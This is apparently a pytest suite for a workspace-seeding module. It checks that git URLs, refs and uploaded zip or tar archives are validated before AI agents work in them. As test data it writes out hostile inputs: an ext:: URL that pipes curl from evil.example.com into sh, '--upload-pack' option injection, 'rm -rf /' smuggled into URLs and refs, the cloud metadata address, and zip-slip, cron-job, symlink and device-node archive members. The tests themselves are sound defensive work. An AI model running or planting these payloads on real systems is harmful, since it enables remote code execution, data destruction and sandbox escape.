"""Seeding a run workspace from an existing codebase.

Every guard here protects a directory the agents subsequently read, write and
execute in, from input a caller supplied. The tests are written from the
attacker's side: what would this let someone do if the check were missing.
"""

import os
import stat
import subprocess
import tarfile
import zipfile
from pathlib import Path

import pytest

from app.server.seeding import (
    SeedError,
    directory_size,
    redact_url,
    seed_from_archive,
    seed_from_git,
    seed_workspace,
    validate_git_ref,
    validate_git_url,
)


@pytest.fixture
def workspace(tmp_path):
    ws = tmp_path / "workspace"
    ws.mkdir()
    return ws


# ---------------------------------------------------------------------------
# Clone URL validation
# ---------------------------------------------------------------------------


def test_an_https_url_is_accepted():
    assert validate_git_url("https://github.com/owner/repo.git")


def test_the_ext_transport_is_refused():
    """`ext::` runs its argument as a command - RCE written into a URL."""
    with pytest.raises(SeedError, match="transport is not allowed"):
        validate_git_url("ext::sh -c 'curl evil.example.com | sh'")


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc",
        "git://example.com/repo.git",
        "ssh://git@example.com/repo.git",
    ],
)
def test_transports_that_read_the_host_or_use_server_keys_are_refused(url):
    with pytest.raises(SeedError, match="transport is not allowed"):
        validate_git_url(url)


def test_a_url_that_is_really_an_option_is_refused():
    """git reads a leading '-' as a flag, not a target."""
    with pytest.raises(SeedError, match="may not begin with '-'"):
        validate_git_url("--upload-pack=touch /tmp/pwned")


def test_a_url_with_a_newline_is_refused():
    with pytest.raises(SeedError, match="control characters"):
        validate_git_url("https://example.com/repo.git\nrm -rf /")


def test_a_url_without_a_scheme_is_refused():
    with pytest.raises(SeedError, match="must include a scheme"):
        validate_git_url("github.com/owner/repo.git")


def test_credentials_in_the_url_are_refused():
    """They would land in argv, the reflog, and every log line quoting the source."""
    with pytest.raises(SeedError, match="Do not put credentials in the URL"):
        validate_git_url("https://user:ghp_secret@github.com/owner/repo.git")


def test_loopback_is_refused_by_default():
    """The server can reach this API, sibling containers, and cloud metadata."""
    with pytest.raises(SeedError, match="private or loopback"):
        validate_git_url("https://127.0.0.1/repo.git")


def test_the_cloud_metadata_address_is_refused():
    """169.254.169.254 hands out credentials to whatever asks it."""
    with pytest.raises(SeedError, match="private or loopback"):
        validate_git_url("https://169.254.169.254/latest/meta-data/")


def test_an_operator_can_allow_an_internal_host(monkeypatch):
    monkeypatch.setenv("SEED_ALLOW_PRIVATE_HOSTS", "true")

    assert validate_git_url("https://10.0.0.5/repo.git")


def test_an_operator_can_widen_the_transports(monkeypatch):
    monkeypatch.setenv("SEED_ALLOWED_SCHEMES", "https,ssh")

    assert validate_git_url("ssh://git@example.com/repo.git")


# ---------------------------------------------------------------------------
# Ref validation
# ---------------------------------------------------------------------------


def test_an_ordinary_branch_name_is_accepted():
    assert validate_git_ref("feature/add-billing") == "feature/add-billing"


def test_no_ref_is_fine():
    assert validate_git_ref(None) is None
    assert validate_git_ref("  ") is None


@pytest.mark.parametrize("ref", ["--upload-pack=sh", "main; rm -rf /", "a..b", "he^ad", "a b"])
def test_a_ref_that_is_not_a_ref_is_refused(ref):
    with pytest.raises(SeedError):
        validate_git_ref(ref)


# ---------------------------------------------------------------------------
# Logging safety
# ---------------------------------------------------------------------------


def test_a_logged_url_keeps_no_credentials_or_query():
    redacted = redact_url("https://user:ghp_secret@github.com/owner/repo.git?token=abc")

    assert "ghp_secret" not in redacted
    assert "abc" not in redacted
    assert redacted == "https://github.com/owner/repo.git"


# ---------------------------------------------------------------------------
# Cloning a real repository
# ---------------------------------------------------------------------------


def _make_origin(path: Path) -> Path:
    """A real local git repository to clone from."""
    path.mkdir(parents=True, exist_ok=True)
    env = {
        **os.environ,
        "GIT_AUTHOR_NAME": "T", "GIT_AUTHOR_EMAIL": "t@e.x",
        "GIT_COMMITTER_NAME": "T", "GIT_COMMITTER_EMAIL": "t@e.x",
    }
    subprocess.run(["git", "init", "-q", "-b", "main", str(path)], check=True, env=env)
    (path / "README.md").write_text("# existing product\n")
    (path / "src").mkdir()
    (path / "src" / "app.py").write_text("print('mvp')\n")
    subprocess.run(["git", "-C", str(path), "add", "-A"], check=True, env=env)
    subprocess.run(["git", "-C", str(path), "commit", "-qm", "initial"], check=True, env=env)
    return path


@pytest.fixture
def origin(tmp_path):
    return _make_origin(tmp_path / "origin")


def test_a_repository_lands_in_the_workspace(workspace, origin, monkeypatch):
    monkeypatch.setenv("SEED_ALLOWED_SCHEMES", "file")

    provenance = seed_from_git(workspace, f"file://{origin}", depth=0)

    assert (workspace / "README.md").read_text() == "# existing product\n"
    assert (workspace / "src" / "app.py").exists()
    assert provenance["type"] == "git"


def test_the_clone_carries_real_git_metadata(workspace, origin, monkeypatch):
    """`build_repository_context` reports "unknown" for a blank workspace; a
    seeded run must give the agents a real branch and commit to work against."""
    monkeypatch.setenv("SEED_ALLOWED_SCHEMES", "file")

    provenance = seed_from_git(workspace, f"file://{origin}", depth=0)

    assert (workspace / ".git").is_dir()
    assert len(provenance["commit"]) == 40

    from app.tools.repository import build_repository_context

    context = build_repository_context(str(workspace))
    assert context.branch == "main"
    assert context.commit == provenance["commit"]


def test_seeding_a_workspace_that_already_has_content_is_refused(workspace, origin, monkeypatch):
    monkeypatch.setenv("SEED_ALLOWED_SCHEMES", "file")
    (workspace / "existing.txt").write_text("prior work")

    with pytest.raises(SeedError, match="already has content"):
        seed_from_git(workspace, f"file://{origin}")


def test_a_clone_that_exceeds_the_size_limit_is_refused(workspace, origin, monkeypatch):
    monkeypatch.setenv("SEED_ALLOWED_SCHEMES", "file")
    monkeypatch.setattr("app.server.seeding.MAX_SEED_BYTES", 10)

    with pytest.raises(SeedError, match="over the"):
        seed_from_git(workspace, f"file://{origin}", depth=0)

    # Nothing partial was left behind for the agents to read.
    assert not any(workspace.iterdir())


def test_a_missing_repository_reports_a_clean_error(workspace, tmp_path, monkeypatch):
    monkeypatch.setenv("SEED_ALLOWED_SCHEMES", "file")

    with pytest.raises(SeedError, match="Clone failed"):
        seed_from_git(workspace, f"file://{tmp_path / 'nope'}")


# ---------------------------------------------------------------------------
# Archives
# ---------------------------------------------------------------------------


def _zip_with(tmp_path: Path, entries: dict[str, str], name="code.zip") -> Path:
    archive = tmp_path / name
    with zipfile.ZipFile(archive, "w") as zf:
        for member, content in entries.items():
            zf.writestr(member, content)
    return archive


def test_an_archive_lands_in_the_workspace(workspace, tmp_path):
    archive = _zip_with(tmp_path, {"project/README.md": "# mvp", "project/src/app.py": "x = 1"})

    provenance = seed_from_archive(workspace, archive)

    assert (workspace / "README.md").read_text() == "# mvp"
    assert (workspace / "src" / "app.py").read_text() == "x = 1"
    assert provenance["type"] == "archive"


def test_a_single_top_level_folder_is_flattened(workspace, tmp_path):
    """`project.zip` conventionally holds one `project/` directory; without
    flattening, every path the agents were given would be off by one segment."""
    archive = _zip_with(tmp_path, {"my-app/pyproject.toml": "[project]"})

    seed_from_archive(workspace, archive)

    assert (workspace / "pyproject.toml").exists()
    assert not (workspace / "my-app").exists()


def test_multiple_top_level_entries_are_kept_as_they_are(workspace, tmp_path):
    archive = _zip_with(tmp_path, {"README.md": "a", "src/app.py": "b"})

    seed_from_archive(workspace, archive)

    assert (workspace / "README.md").exists()
    assert (workspace / "src" / "app.py").exists()


def test_a_zip_traversal_member_is_refused(workspace, tmp_path):
    """Zip-slip: extraction writes outside the workspace entirely."""
    archive = _zip_with(tmp_path, {"../../escaped.txt": "pwned"})

    with pytest.raises(SeedError, match="traversal path"):
        seed_from_archive(workspace, archive)


def test_an_absolute_zip_member_is_refused(workspace, tmp_path):
    archive = _zip_with(tmp_path, {"/etc/cron.d/pwned": "* * * * * root sh"})

    with pytest.raises(SeedError, match="absolute path"):
        seed_from_archive(workspace, archive)


def test_a_zip_symlink_is_refused(workspace, tmp_path):
    """A symlink to / lets a *later* member be written anywhere on the host."""
    archive = tmp_path / "link.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        info = zipfile.ZipInfo("escape")
        info.external_attr = (stat.S_IFLNK | 0o777) << 16
        zf.writestr(info, "/")

    with pytest.raises(SeedError, match="symlink"):
        seed_from_archive(workspace, archive)


def test_a_zip_bomb_is_refused_before_anything_is_written(workspace, tmp_path, monkeypatch):
    monkeypatch.setattr("app.server.seeding.MAX_SEED_BYTES", 100)
    archive = _zip_with(tmp_path, {"big.txt": "x" * 5000})

    with pytest.raises(SeedError, match="expands to over"):
        seed_from_archive(workspace, archive)

    assert not any(workspace.iterdir())


def test_too_many_members_are_refused(workspace, tmp_path, monkeypatch):
    monkeypatch.setattr("app.server.seeding.MAX_ARCHIVE_MEMBERS", 3)
    archive = _zip_with(tmp_path, {f"f{i}.txt": "x" for i in range(10)})

    with pytest.raises(SeedError, match="over the"):
        seed_from_archive(workspace, archive)


def test_a_tarball_lands_in_the_workspace(workspace, tmp_path):
    source = tmp_path / "src-tree"
    (source / "app").mkdir(parents=True)
    (source / "app" / "main.py").write_text("run()")
    archive = tmp_path / "code.tar.gz"
    with tarfile.open(archive, "w:gz") as tf:
        tf.add(source, arcname="app-root")

    seed_from_archive(workspace, archive)

    assert (workspace / "app" / "main.py").read_text() == "run()"


def test_a_tar_traversal_member_is_refused(workspace, tmp_path):
    payload = tmp_path / "payload"
    payload.write_text("pwned")
    archive = tmp_path / "evil.tar"
    with tarfile.open(archive, "w") as tf:
        tf.add(payload, arcname="../../escaped.txt")

    with pytest.raises(SeedError, match="traversal path"):
        seed_from_archive(workspace, archive)


def test_a_tar_symlink_is_refused(workspace, tmp_path):
    archive = tmp_path / "link.tar"
    with tarfile.open(archive, "w") as tf:
        info = tarfile.TarInfo("escape")
        info.type = tarfile.SYMTYPE
        info.linkname = "/etc/passwd"
        tf.addfile(info)

    with pytest.raises(SeedError, match="link"):
        seed_from_archive(workspace, archive)


def test_a_tar_device_node_is_refused(workspace, tmp_path):
    archive = tmp_path / "dev.tar"
    with tarfile.open(archive, "w") as tf:
        info = tarfile.TarInfo("dev/sda")
        info.type = tarfile.BLKTYPE
        tf.addfile(info)

    with pytest.raises(SeedError, match="special file"):
        seed_from_archive(workspace, archive)


def test_a_file_that_is_not_an_archive_is_refused(workspace, tmp_path):
    plain = tmp_path / "notes.zip"
    plain.write_text("this is not a zip")

    with pytest.raises(SeedError, match="not a readable zip or tar"):
        seed_from_archive(workspace, plain)


def test_an_unsupported_extension_is_refused(workspace, tmp_path):
    other = tmp_path / "code.rar"
    other.write_text("x")

    with pytest.raises(SeedError, match="not a supported archive"):
        seed_from_archive(workspace, other)


def test_a_missing_archive_is_refused(workspace, tmp_path):
    with pytest.raises(SeedError, match="Archive not found"):
        seed_from_archive(workspace, tmp_path / "gone.zip")


# ---------------------------------------------------------------------------
# Dispatch
# ---------------------------------------------------------------------------


def test_no_source_leaves_a_greenfield_workspace_empty(workspace):
    result = seed_workspace(workspace, None, resolve_upload=lambda _: None)

    assert result.seeded is False
    assert result.provenance == {"type": "empty"}
    assert not any(workspace.iterdir())


def test_an_explicit_empty_source_is_also_greenfield(workspace):
    from types import SimpleNamespace

    result = seed_workspace(workspace, SimpleNamespace(type="empty"), resolve_upload=lambda _: None)

    assert result.seeded is False


def test_an_archive_source_is_dispatched(workspace, tmp_path):
    from types import SimpleNamespace

    archive = _zip_with(tmp_path, {"app/main.py": "run()"})
    source = SimpleNamespace(type="archive", upload_id="u-1")

    result = seed_workspace(workspace, source, resolve_upload=lambda _: archive)

    assert result.seeded is True
    assert (workspace / "main.py").exists()


def test_an_unknown_upload_is_refused(workspace):
    from types import SimpleNamespace

    with pytest.raises(SeedError, match="could not be found"):
        seed_workspace(
            workspace, SimpleNamespace(type="archive", upload_id="nope"),
            resolve_upload=lambda _: None,
        )


def test_an_unknown_source_type_is_refused(workspace):
    from types import SimpleNamespace

    with pytest.raises(SeedError, match="Unknown workspace source"):
        seed_workspace(workspace, SimpleNamespace(type="ftp"), resolve_upload=lambda _: None)


# ---------------------------------------------------------------------------
# Size accounting
# ---------------------------------------------------------------------------


def test_directory_size_counts_nested_files(tmp_path):
    (tmp_path / "a").write_text("12345")
    (tmp_path / "sub").mkdir()
    (tmp_path / "sub" / "b").write_text("123")

    assert directory_size(tmp_path) == 8


def test_directory_size_does_not_follow_symlinks(tmp_path):
    """Otherwise a link to /usr would make any repository look enormous."""
    (tmp_path / "real").write_text("12345")
    (tmp_path / "link").symlink_to(tmp_path / "real")

    assert directory_size(tmp_path) == 5
